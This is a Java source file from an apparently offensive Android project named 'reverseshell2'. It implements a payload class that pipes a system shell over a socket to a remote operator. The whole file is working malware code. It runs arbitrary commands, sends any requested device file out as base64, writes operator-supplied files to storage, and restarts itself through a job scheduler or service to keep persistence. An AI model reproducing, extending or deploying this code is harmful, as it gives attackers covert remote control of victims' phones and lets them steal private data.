package com.example.reverseshell2.Payloads;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.AndroidRuntimeException;
import android.util.Base64;
import android.util.Log;

import com.example.reverseshell2.functions;
import com.example.reverseshell2.mainService;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

public class newShell {
    static String TAG="newTAGClass";
    Context context;
    functions functions;
    Activity activity;

    public newShell(Activity activity,Context context) {
        this.context = context;
        this.activity = activity;
        functions = new functions(activity);
    }

    public void executeShell(final Socket socket, OutputStream outputStream) throws Exception {

        outputStream.write("----------Starting Shell----------\n".getBytes("UTF-8"));
        outputStream.write("END123\n".getBytes("UTF-8"));
        String cmd = "system/bin/sh";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = socket.getInputStream();
        OutputStream po = p.getOutputStream(), so = socket.getOutputStream();
        BufferedReader buff1 = new BufferedReader(new InputStreamReader(si));
        BufferedReader buff2 = new BufferedReader(new InputStreamReader(pi));
        String line;
        while (!socket.isClosed()) {

            try{
            while (pi.available() > 0) {
                String b = "";
                while (buff2.ready()) {
                    line = buff2.readLine();
                    b += line + "\n";
                }
                Log.d(TAG, b);
                so.write(b.getBytes("UTF-8"));
                so.write("END123\n".getBytes("UTF-8"));
            }
            while (pe.available() > 0) {
                so.write(pe.read());
            }
            while (si.available() > 0) {
                String a = buff1.readLine();
                a += "\n";
                Log.d(TAG,a);
                if (a.startsWith("putFile")) {
                    String[] data = a.split("\\<");
                    String filename = data[1];
                    String fileext = data[2];
                    String encodedString = data[3];
                    encodedString = encodedString.replace("END123\n", "");
                    String fullFile = filename + "." + fileext;
                    setBase64Data(fullFile, encodedString);
                } else if (a.startsWith("get ")) {
                    String filepath = a.split(" ")[1].trim();
                    Log.d(TAG, filepath);
                    File file = new File(filepath);
                    if (file.exists()) {
                        String sending_filedata = "";
                        String full_filename = filepath.substring(filepath.lastIndexOf("/") + 1);
                        String[] file_data = full_filename.split("\\.");
                        Log.d(TAG, "exists");
                        String base64_data = getBase64Data(file);
                        if(base64_data == null){
                            so.write("Cant transfer Large File\nEND123\n".getBytes("UTF-8"));
                        }
                        so.write("getFile\nEND123\n".getBytes("UTF-8"));
                        sending_filedata += file_data[0] + "|_|" + file_data[1] + "|_|" + base64_data + "\nEND123\n";
                        so.write(sending_filedata.getBytes("UTF-8"));
                    } else {
                        Log.d(TAG, "notexists");
                        so.write("File Doesnt Exists\nEND123\n".getBytes("UTF-8"));
                    }
                } else if (a.startsWith("put ")) {
                    so.write("putFile\nEND123\n".getBytes("UTF-8"));
                } else {
                    po.write(a.getBytes("UTF-8"));
                }
            }
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            } catch (Exception e) {
            }
        }catch (Exception e){
                Log.d("service_runner","called");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    functions.jobScheduler(context);
                }else{
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            context.startService(new Intent(context, mainService.class));
                        }
                    });
                }
                e.printStackTrace();
            }
            }
            so.write("Exiting\n".getBytes("UTF-8"));
            so.write("END123\n".getBytes("UTF-8"));
            p.destroy();
        }


    private String getBase64Data(File file) {
        byte[] getBytes = {};
        try {
            getBytes = new byte[(int) file.length()];
            Log.d(TAG, String.valueOf(file.length()));
            if(file.length()>16000000){
                return null;
            }
            InputStream is = new FileInputStream(file);
            is.read(getBytes);
            is.close();
        }catch (IOException e) {
            e.printStackTrace();
        }
        String value="";
        try{
            value = Base64.encodeToString(getBytes, Base64.DEFAULT);
        }catch (AndroidRuntimeException e){
            e.printStackTrace();
            return null;
        }
        return value;
    }

    private void setBase64Data(String filename, final String base64Data){

        String myfolder="/sdcard/temp";
        File f=new File(myfolder);
        if(!f.exists()){
            f.mkdir();
        }
        final File file = new File(myfolder+"/"+ filename);
        if (file.exists()) {
            file.delete();
        }
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                    file.createNewFile();
                    FileOutputStream fos  = new FileOutputStream(file);
                    fos.write(Base64.decode(base64Data, Base64.NO_WRAP));
                    fos.close();
                    } catch (FileNotFoundException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                }
            }).start();
    }

}
